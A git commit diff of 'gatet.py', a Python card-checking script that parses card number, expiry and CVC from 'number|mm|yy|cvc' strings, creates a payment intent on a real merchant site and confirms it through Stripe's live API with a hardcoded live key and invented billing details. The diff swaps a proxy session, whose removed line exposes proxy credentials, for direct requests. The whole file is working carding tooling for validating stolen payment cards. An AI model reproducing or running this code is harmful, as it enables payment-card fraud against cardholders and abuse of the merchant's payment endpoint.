c35e42025ef59628ff48130bc698382ac833a146
Daokhaosaard13 <daokhaosaard13@gmail.com>
2025-05-09 11:48:37 +0700

    Update gatet.py

--- gatet.py
+++ gatet.py
@@ -1,9 +1,6 @@
 import requests,re
-from proxy import reqproxy, make_request
 def Tele(ccx):
-	proxy_str = "brd.superproxy.io:33335:brd-customer-hl_79bd0714-zone-datacenter_proxy1:5aqamf4mqtlv"
-	session, ip = reqproxy(proxy_str)
-	#print(f"IP Address: {ip}")
+	import requests
 	ccx=ccx.strip()
 	n = ccx.split("|")[0]
 	mm = ccx.split("|")[1]
@@ -36,7 +33,7 @@ def Tele(ccx):
 	    'is_webinar': '',
 	}
 	
-	response = session.post('https://webpro-it.co.uk/handle-payment-intent', headers=headers, data=data)
+	response = requests.post('https://webpro-it.co.uk/handle-payment-intent', headers=headers, data=data)
 	
 	pi = re.search(r'"client_secret":"(.*?)_secret_', response.text).group(1)
 	client_secret = response.json()['client_secret']
@@ -59,7 +56,7 @@ def Tele(ccx):
 	
 	data = f'payment_method_data[billing_details][address][city]=New+York&payment_method_data[billing_details][address][country]=TH&payment_method_data[billing_details][address][line1]=Street+27&payment_method_data[billing_details][address][line2]=&payment_method_data[billing_details][address][postal_code]=10080&payment_method_data[billing_details][email]=rodamuser08%40gmail.com&payment_method_data[billing_details][phone]=4303000850&payment_method_data[type]=card&payment_method_data[card][number]={n}&payment_method_data[card][cvc]={cvc}&payment_method_data[card][exp_year]={yy}&payment_method_data[card][exp_month]={mm}&payment_method_data[allow_redisplay]=unspecified&payment_method_data[payment_user_agent]=stripe.js%2F4b16495512%3B+stripe-js-v3%2F4b16495512%3B+payment-element&payment_method_data[client_attribution_metadata][client_session_id]=NA&payment_method_data[client_attribution_metadata][merchant_integration_source]=elements&payment_method_data[client_attribution_metadata][merchant_integration_subtype]=payment-element&payment_method_data[client_attribution_metadata][merchant_integration_version]=2021&payment_method_data[client_attribution_metadata][payment_intent_creation_flow]=standard&payment_method_data[client_attribution_metadata][payment_method_selection_flow]=merchant_specified&expected_payment_method_type=card&use_stripe_sdk=true&key=pk_live_51PGz0w1kvJf1dIf4pdlqcaWDriITzYeEUjvr9CXtDfYklV1MZnHVw6qsv8yKZncbbqodNRHv3T3jzkvFbqdRUf3300ptDG3gzB&client_secret={client_secret}'
 	
-	response = session.post(
+	response = requests.post(
 	    f'https://api.stripe.com/v1/payment_intents/{pi}/confirm',
 	    headers=headers,
 	    data=data,
